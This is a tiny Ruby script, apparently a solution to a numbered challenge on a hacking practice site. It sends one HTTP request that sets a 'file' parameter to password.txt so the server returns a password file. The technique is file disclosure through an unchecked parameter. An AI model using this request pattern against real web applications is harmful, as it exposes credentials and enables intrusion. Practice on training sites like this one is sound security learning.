#!/usr/bin/ruby
require 'net/http'
puts Net::HTTP.get(URI.parse('http://www.hackerschool.jp/hack/take11/index.php?file=password.txt'))